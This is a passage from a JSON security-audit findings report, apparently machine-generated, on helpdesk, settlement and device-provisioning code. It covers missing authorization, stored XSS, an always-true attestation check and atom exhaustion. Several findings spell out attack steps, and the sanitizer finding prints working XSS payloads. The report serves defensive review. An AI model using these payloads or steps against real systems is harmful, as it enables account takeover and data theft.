+      "evidence": "rows_from yields `record.get('entry_id') or str(uuid.uuid4())` as the primary key and `record.get('org_id') or org_id` as the owning org, both straight from the CSV, and load() hands the batch to store.append_raw, which executes `INSERT OR REPLACE INTO entries VALUES (...)` (store.py:69-76). None of the checks that guard the Kafka path apply: no signature, no topic ceiling (apply.py:46), no account-ownership check (apply.py:51) and no DAILY_ACCOUNT_LIMIT_CENTS (apply.py:55). The --org argument is only a fallback, so a CSV column silently overrides the operator's intent.",
+      "impact": "A settlement export that contains an entry_id matching an existing row replaces that row wholesale - amount, account, org and memo - with no error and no audit record; the run reports only a count. Because org_id is also file-controlled, entries can be attributed to any org. The export comes from a third party (the settlement bank) per the module docstring, so its contents are outside the operator's control.",
+      "recommendation": "Treat entry_id as untrusted: reject rows whose id already exists (or use INSERT ... ON CONFLICT DO NOTHING and report the skips), and ignore any org_id column in favour of the --org argument. Validate amounts against the same ceilings the streaming path applies.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). backfill.py:34-50 and store.py:69-76 verified."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `csv.DictReader(fh)` at backfill.py:36 reading a file authored by the settlement bank, which the docstring identifies as an external party."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The code path is unambiguous, but it requires an operator to run the tool against a hostile or malformed export, which could not be demonstrated here; status set to probable."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 6 (evaluate_questionable_file_paths); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). admin/ is operator tooling, not test or mock code; it has a __main__ entry point and is the documented reconciliation loader."
+        }
+      ]
+    },
+    {
+      "title": "Ticket cache key omits the caller's scope, so a cached ticket is served across orgs",
+      "location": {
+        "path": "helpdesk-live/lib/helpdesk_web/live/ticket_live.ex",
+        "symbol": "mount/3",
+        "line": 20
+      },
+      "class": "Cross-tenant data exposure",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "`Cache.fetch_ticket(id, fn -> Tickets.get_scoped(id, scope) end)` - the ETS key is {:ticket, id} (cache.ex:24/30) and carries no org, tenancy or role component, while `scope` (from Policy.org_scope(agent), which returns {:org, id} or {:tenancy_of, id}) is applied only inside the loader. cache.ex:25-26 returns the stored value on a live entry without calling the loader, so on a hit the org filter in Tickets.apply_scope (tickets.ex:29-42) is never evaluated. The table is :public and :named_table (cache.ex:15), shared by every LiveView process on the node, with a 60s TTL.",
+      "impact": "After any agent - or an auditor, whose scope is tenancy-wide (policy.ex:39) - loads ticket T, every other agent on that node who mounts /tickets/T within 60 seconds receives the full ticket with its notes and attachments preloaded (tickets.ex:17), regardless of org. The miss path also caches nil, so a non-entitled agent's lookup denies the ticket to its rightful owner for the rest of the TTL.",
+      "recommendation": "Key the cache by scope as well as id, e.g. {:ticket, scope, id}, and do not cache nil results. If the join is expensive enough to need a cache, cache the row and re-run the authorisation check on every read instead of caching the authorisation decision.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). ticket_live.ex:18-20 and cache.ex:21-33 verified; scope construction at policy.ex:37-40; the filter it bypasses at tickets.ex:29-42."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the `\"id\"` route parameter at ticket_live.ex:15 (route live \"/tickets/:id\" at router.ex:28) - the attacker chooses the id that is the entire cache key."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Cache.fetch_ticket does what it says; the defect is the key this call site constructs."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Two mounts inside the TTL reproduce it deterministically; no race required."
+        }
+      ]
+    },
+    {
+      "title": "update_note applies a client-supplied note id with no authorization check",
+      "location": {
+        "path": "helpdesk-live/lib/helpdesk_web/live/ticket_live.ex",
+        "symbol": "handle_event/3 (\"update_note\")",
+        "line": 71
+      },
+      "class": "Missing authorization",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The handler is `Tickets.update_note(note_id, Sanitizer.sanitize_html(body))` and nothing else - no Policy.can_write?, no check that the note belongs to socket.assigns.ticket, no org comparison. Contrast the sibling handler create_note directly above it (lines 54-65), which does gate on Policy.can_write?(agent, ticket). Tickets.update_note itself does an unscoped `Repo.get!(Note, note_id)` (tickets.ex:55). note_id arrives from the client: the form posts a hidden input (ticket_live.html.heex:26) over the LiveView channel, so its value is entirely under the caller's control and is not constrained to the notes rendered on the page.",
+      "impact": "Any authenticated agent can rewrite the body of any note in any org by sending an update_note event with that note's id. This includes the auditor role, for which Policy.can_write? returns false unconditionally (policy.ex:19) - the compliance sampling role can silently edit the records it is meant to audit.",
+      "recommendation": "Load the note through a scoped query (by ticket_id and the agent's org_scope), assert Policy.can_write?(agent, ticket) exactly as create_note does, and reject the event otherwise. Do not trust ids echoed back from the client to be the ones you rendered.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). ticket_live.ex:71-75, tickets.ex:54-58, ticket_live.html.heex:25-29 and policy.ex:18-24 all verified."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the LiveView event payload `%{\"note_id\" => note_id}` at ticket_live.ex:71 - a websocket message body the client composes."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). This is a missing primary authorisation check on a mutating handler, demonstrated by the adjacent handler that has one."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). A single crafted event reproduces it."
+        }
+      ]
+    },
+    {
+      "title": "escalate mutates the ticket without checking write permission",
+      "location": {
+        "path": "helpdesk-live/lib/helpdesk_web/live/ticket_live.ex",
+        "symbol": "handle_event/3 (\"escalate\")",
+        "line": 77
+      },
+      "class": "Missing authorization",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "`{:ok, ticket} = Tickets.escalate(socket.assigns.ticket, tier)` with no Policy.can_write? call, while create_note (line 58) performs exactly that check before writing. `tier` comes straight from the form (ticket_live.html.heex:41-44) and is passed unvalidated into the changeset (tickets.ex:60-64). The on_mount hook does not compensate: its @guarded list is [:edit, :delete, :new] (require_agent.ex:15) and the route for this action is live_action :escalate (router.ex:30).",
+      "impact": "An auditor - the tenancy-wide read-only compliance role, for which can_write? returns false unconditionally - can escalate tickets and stamp escalated_at. Combined with the unscoped ticket cache above, an agent who obtains another org's ticket into socket.assigns can escalate it too.",
+      "recommendation": "Wrap the handler in the same `if Policy.can_write?(agent, ticket)` guard create_note uses, and validate tier against the allowed set rather than passing the raw form value to the changeset.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). ticket_live.ex:77-81, tickets.ex:60-64, policy.ex:18-24 and require_agent.ex:15 verified."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the LiveView event payload `%{\"tier\" => tier}` at ticket_live.ex:77."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The role model defines an explicitly read-only role that this handler ignores; that is a primary control, not hardening."
+        }
+      ]
+    },
+    {
+      "title": "Denylist HTML sanitizer leaves event handlers intact and is rendered with raw/1",
+      "location": {
+        "path": "helpdesk-live/lib/helpdesk/sanitizer.ex",
+        "symbol": "sanitize_html/1",
+        "line": 18
+      },
+      "class": "Stored cross-site scripting",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "sanitize_html applies four removal regexes - script blocks, stray script tags, `javascript:` and `data:text/html` - and nothing else, then truncates. There is no tag allowlist and no attribute filter. Both sinks render the result unescaped: `raw(@ticket.body_html)` (ticket_live.html.heex:12) and `raw(note.body_html)` (line 18). Micro-harness reproducing the four regexes with Elixir's global-single-pass String.replace semantics: `<img src=x onerror=...>`, `<svg onload=alert(1)>`, `<iframe srcdoc=...>` and `<body onload=alert(1)>` all pass through unchanged, and the removal-based scheme filter is self-defeating - the input `javajavascript:script:alert(1)` comes out as `javascript:alert(1)` because deleting the inner match splices the outer one back together.",
+      "impact": "The module doc says the HTML part of customer email is stored and shown to agents, so any customer who replies to a ticket achieves stored XSS in the agent console: session cookie theft, actions performed as the agent over the LiveView channel (including the unauthenticated update_note handler above), and persistence for every agent who opens the ticket.",
+      "recommendation": "Replace the denylist with a parse-and-allowlist sanitizer (html_sanitize_ex :basic_html or a scrubber that keeps only the tags and attributes the console needs, dropping all on* attributes and all non-http schemes). Keep raw/1 only over output from that sanitizer, and prefer escaping at render time.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). sanitizer.ex:9-25 and the two raw/1 sinks at ticket_live.html.heex:12 and 18 verified."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the module docstring identifies the email gateway as the writer of body_html, and the note path takes it from the LiveView `\"body\"` event field at ticket_live.ex:54/71."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 9 (verify_mitigations_pragmatically); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The mitigation was evaluated on its own terms and measured to fail: the micro-harness shows five payload classes surviving, including one that the filter itself constructs."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 4 (avoid_pedantic_linting); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Not a complaint about a safe standard library - this is a hand-rolled regex denylist replacing a parser."
+        }
+      ]
+    },
+    {
+      "title": "Attachment download and upload routes are outside the :require_agent pipeline",
+      "location": {
+        "path": "helpdesk-live/lib/helpdesk_web/router.ex",
+        "symbol": "scope \"/attachments\"",
+        "line": 38
+      },
+      "class": "Missing authentication",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The console scope pipes through [:browser, :require_agent] (router.ex:24) but the attachments scope pipes through :browser only, so ensure_agent (router.ex:64-69) never runs for GET /attachments/:ticket_id/:filename or POST /attachments/:ticket_id. AttachmentController performs no check of its own either - its docstring states outright that it 'is concerned with picking the right file rather than with who is asking' and relies on 'the console pipeline' that this scope does not include. The id and filename regexes (lines 14-15) prevent path traversal but say nothing about authorisation.",
+      "impact": "Anyone who learns or brute-forces a ticket UUID downloads that ticket's attachments with no session at all, across orgs. The POST route is worse: an unauthenticated caller writes arbitrary file content to priv/uploads/<ticket_id>/<name> and File.cp! silently overwrites an existing attachment, so support evidence can be replaced. protect_from_forgery does not help - a direct attacker holds their own session and can obtain a valid token; it blocks cross-site submission only.",
+      "recommendation": "Add :require_agent to the attachments scope and authorise per ticket inside the controller (Tickets.get_scoped(ticket_id, Policy.org_scope(agent)) before serving or writing). Refuse to overwrite an existing attachment, and store uploads outside the application's priv directory.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). router.ex:23-42 and attachment_controller.ex:17-44 verified; pipeline definitions at router.ex:19-21 and 64-69."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the `\"ticket_id\"` and `\"filename\"` path params and the `\"file\"` multipart upload at attachment_controller.ex:17/34 - all attacker-supplied on an unauthenticated route."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Missing authentication on a route that both reads and writes customer data is a primary control, and the route is not local-only."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 9 (verify_mitigations_pragmatically); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The traversal mitigations (safe_id/safe_name) are credited as effective - the finding is scoped to authorisation, not to path handling."
+        }
+      ]
+    },
+    {
+      "title": "String.to_atom on the sort query parameter creates unbounded atoms from user input",
+      "location": {
+        "path": "helpdesk-live/lib/helpdesk_web/live/ticket_live.ex",
+        "symbol": "sort_key/1",
+        "line": 51
+      },
+      "class": "Uncontrolled resource consumption",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "`defp sort_key(value), do: String.to_atom(value)` is applied to params[\"sort\"] on every handle_params (line 47), which fires on the initial mount and on every live_patch. Atoms are never garbage collected in the BEAM and the atom table has a fixed limit (1,048,576 by default); exceeding it aborts the VM. The value is never validated against a known column list, and the resulting :sort assign is not read by the template at all - list_scoped is called with the hardcoded :inserted_at (line 42) - so atom creation is the only effect this code has.",
+      "impact": "Any authenticated agent can crash the whole node, and every other tenant's session on it, by requesting /tickets?sort=<random> in a loop until the atom table fills. Recovery requires a restart, and the exhausted table means the condition persists across reconnects until then.",
+      "recommendation": "Use String.to_existing_atom inside a try/rescue, or better, match against an explicit allowlist: `defp sort_key(\"amount\"), do: :amount` ... `defp sort_key(_), do: :inserted_at`.",
+      "triage": [
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 7 (ignore_resource_exhaustion_dos); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Rule 07 targets modules criticised for lacking recursion limits or input-size bounds in otherwise-safe parsers. This is a different class: an unbounded interning primitive applied directly to unvalidated input, exhausting a fixed global table that is never reclaimed, terminating the VM rather than degrading a request. Reported on that basis."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). ticket_live.ex:46-51 verified; the unused :sort assign confirmed by reading ticket_live.html.heex in full."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `params[\"sort\"]` at ticket_live.ex:47 - a URL query parameter."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 4 (avoid_pedantic_linting); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). String.to_atom on external input is a named Erlang/Elixir vulnerability pattern, not a paranoid preference over a safe standard call."
+        }
+      ]
+    },
+    {
+      "title": "on_mount guard list does not cover the mutating live actions the router declares",
+      "location": {
+        "path": "helpdesk-live/lib/helpdesk_web/live/on_mount/require_agent.ex",
+        "symbol": "@guarded",
+        "line": 15
+      },
+      "class": "Incomplete access control",
+      "severity": "low",
+      "status": "probable",
+      "evidence": "@guarded is [:edit, :delete, :new]. The router declares live actions :index, :show, :edit, :escalate and :assign (router.ex:27-31) - so :escalate and :assign, the two mutating actions, fall into the `live_action not in @guarded -> {:cont, socket}` branch, while :delete and :new are listed but have no route at all. The hook's own docstring says it 'is what keeps the mutating actions honest on a socket that reconnects without replaying the pipeline', which is the opposite of what the list encodes.",
+      "impact": "The hook contributes nothing for :escalate and :assign. The :require_agent router pipeline still covers the initial HTTP render and the LiveView session is signed, so no bypass could be demonstrated - hence low and probable. The consequence is that the layer intended to backstop a reconnect is inert for exactly the actions it names, and the list will silently stay wrong as routes are added.",
+      "recommendation": "Invert the check: guard everything except an explicit @public list, so a newly added live action is protected by default. Add a compile-time or test assertion that every live action declared in the router is covered.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). require_agent.ex:15-31 and router.ex:26-32 verified; the mismatch is exact."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). No triggerable bypass demonstrated: the router pipeline covers the same nil-agent condition on the HTTP mount and the session is signed. Reported as an incomplete control, status probable."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "UNKNOWN",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Arguably defence-in-depth, which rule 02 would exclude; retained because the module documents itself as the reconnect-time control and the omission is a list that disagrees with the router rather than an absent extra."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Not a data-flow finding; there is no tainted value to trace to a sink."
+        }
+      ]
+    },
+    {
+      "title": "Internal operator routes are registered outside the authenticate block and have no checks of their own",
+      "location": {
+        "path": "fleet-provision/src/main/kotlin/com/fleet/Application.kt",
+        "symbol": "Application.module",
+        "line": 72
+      },
+      "class": "Missing authentication",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "deviceRoutes, enrollmentRoutes and firmwareRoutes are nested inside `rateLimit(...) { authenticate(\"fleet-jwt\") { ... } }` (lines 63-69). internalRoutes(config) sits outside both, at the top level of routing (line 72). Internal.kt then performs no principal check anywhere: none of /internal/health, /internal/devices, /internal/devices/rotate-key or /internal/firmware/pin calls requireScope or reads a JWTPrincipal. The only stated control is the comment 'These endpoints are only routed from inside the cluster network by the fleet control plane' (Internal.kt:29-31), and application.conf binds a single listener on port 8080 (lines 2-5) with no second connector, no host restriction and no IP filter.",
+      "impact": "Every internal endpoint is served unauthenticated on the same public port as the API. GET /internal/devices dumps the full device registry (serials, models, public keys). POST /internal/devices/rotate-key mints and returns a 32-byte provisioning key for any known serial. POST /internal/firmware/pin publishes an arbitrary FirmwareRelease into any channel - and unlike /api/firmware/publish (Firmware.kt:50-53) it does not even check the sha256 length - so an unauthenticated caller can point a fleet update channel at an artifact and digest of their choosing.",
+      "recommendation": "Move internalRoutes inside authenticate(\"fleet-jwt\") and require an operator scope on each handler, or bind it to a separate connector that is not exposed. Do not rely on a network-topology assumption that the process cannot verify. At minimum apply the sha256 validation from Firmware.kt:50 to /internal/firmware/pin.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Application.kt:58-73 and Internal.kt:32-57 verified; the single-listener configuration verified at application.conf:1-9."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `call.receive<RotateRequest>()` at Internal.kt:43 and `call.receive<FirmwareRelease>()` at line 53 - request bodies on unauthenticated routes."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). These are not local-only test functions: they mutate the firmware catalogue that the authenticated /api/firmware surface reads."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 9 (verify_mitigations_pragmatically); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The claimed mitigation (cluster-network-only routing) was looked for in the configuration and does not exist in this tree."
+        }
+      ]
+    },
+    {
+      "title": "Attestation.verify never checks the signature and returns a tautology",
+      "location": {
+        "path": "fleet-provision/src/main/kotlin/com/fleet/security/Permissions.kt",
+        "symbol": "Attestation.verify",
+        "line": 71
+      },
+      "class": "Improper cryptographic verification",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The function computes `MessageDigest.getInstance(\"SHA-256\").digest(...)` and returns `digest.isNotEmpty()`. A SHA-256 digest is always 32 bytes, so the final expression is unconditionally true; the computed digest is never compared to blob.signature or to anything else, and no key is ever loaded. The three preceding checks do not close the gap: blob.nonce must equal the nonce the service just handed out (obtainable from GET /api/devices/{serial}/nonce, which has no scope check), blob.certificateChainSha256 is compared against config.attestationRootFingerprint - a fixed public constant checked into application.conf:27 and supplied by the caller in the request - and blob.signature only has to be 64 characters long.",
+      "impact": "Device attestation provides no assurance at all. Any caller who can reach POST /api/devices/enroll can forge an AttestationBlob that passes: request a nonce for the target serial, echo it back with the published root fingerprint and 64 arbitrary characters. This is the sole control the enrolment path relies on, since that route performs no scope check either.",
+      "recommendation": "Verify the signature: load the manufacturing root's public key, validate the presented certificate chain against it, confirm the chain's fingerprint, and verify blob.signature over the serial||nonce message with the leaf key. Fail closed on any parse error. Do not accept a caller-supplied fingerprint as evidence of chain validity.",
+      "triage": [
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 8 (intrinsic_security_flaws); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). An always-true verification function is an intrinsic flaw in the security primitive itself; rule 08 keeps it valid independently of callers, and it does have one."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Permissions.kt:58-72 verified; caller at Devices.kt:89-93; the fingerprint constant at application.conf:27."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `call.receive<EnrollRequest>()` at Devices.kt:86, whose `attestation` field is the AttestationBlob passed straight to verify."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 9 (verify_mitigations_pragmatically); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The mitigation was evaluated rather than assumed: the nonce and fingerprint checks are real but neither authenticates the caller, and the signature check is absent."
+        }
+      ]
+    },
+    {
+      "title": "Failed attestations are stashed and replayed by the retry endpoint without re-verification",
+      "location": {
+        "path": "fleet-provision/src/main/kotlin/com/fleet/routes/Enrollment.kt",
+        "symbol": "enrollmentRoutes /{serial}/retry",
+        "line": 56
+      },
+      "class": "Authentication bypass",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The enrol handler stashes the request precisely on the failure branch: `if (!attested) { DeviceRegistry.stashPending(request); call.respond(Forbidden, ...) }` (Devices.kt:94-100). The retry endpoint then pulls that parked request and enrols it directly - `val device = DeviceRegistry.enroll(parked.serial, parked.model, parked.publicKey)` - with no call to Attestation.verify and no nonce check. Its comment, 'The stored request is the one the device already sent, so it goes straight to the registry', is true but omits that the stored request is the one that was rejected. The only gate is requireScope(\"devices:write\"), which any subject beginning with 'svc-' satisfies unconditionally (Permissions.kt:34-37).",
+      "impact": "Attestation can be bypassed in two calls regardless of whether Attestation.verify is ever fixed: submit an enrolment that deliberately fails, then call POST /api/enrollment/{serial}/retry. The device is registered with the attacker's public key, and DeviceRegistry.enroll overwrites any existing entry for that serial (Devices.kt:52-53), so an already-provisioned device can be taken over.",
+      "recommendation": "Do not persist rejected requests as replayable state. If an operator replay path is genuinely needed, re-run Attestation.verify against a freshly issued nonce inside the retry handler, and store the rejection as an audit record rather than as a pending enrolment.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Devices.kt:85-105 and 59-64, Enrollment.kt:46-58 verified; the overwrite semantics at Devices.kt:51-57."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `call.receive<EnrollRequest>()` at Devices.kt:86 - the attacker authors the request that gets parked, then triggers its replay via the `{serial}` path parameter at Enrollment.kt:49."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Both halves are production handlers in this tree; no hypothetical caller is involved."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 5 (no_security_flaw_stretching); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Not an adjacent class invented around a working mitigation - this is a second path that skips the mitigation entirely."
+        }
+      ]
+    },
+    {
+      "title": "Any subject prefixed svc- is granted every scope by requireScope",
+      "location": {
+        "path": "fleet-provision/src/main/kotlin/com/fleet/security/Permissions.kt",
+        "symbol": "requireScope",
+        "line": 36
+      },
+      "class": "Broken access control",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "requireScope reads the JWT subject and, when isServiceToken(subject) is true - i.e. the subject starts with the literal 'svc-' (line 17) - returns true immediately, without ever reading the `scope` claim (lines 34-40). The scope comparison at lines 42-46 is reached only by non-service subjects. The doc comment asserts 'the prefix here is what picks the right audit label rather than a trust decision on its own', but the code makes the prefix the entire decision. Token.kt:55 sets the subject from the client_id the caller submits.",
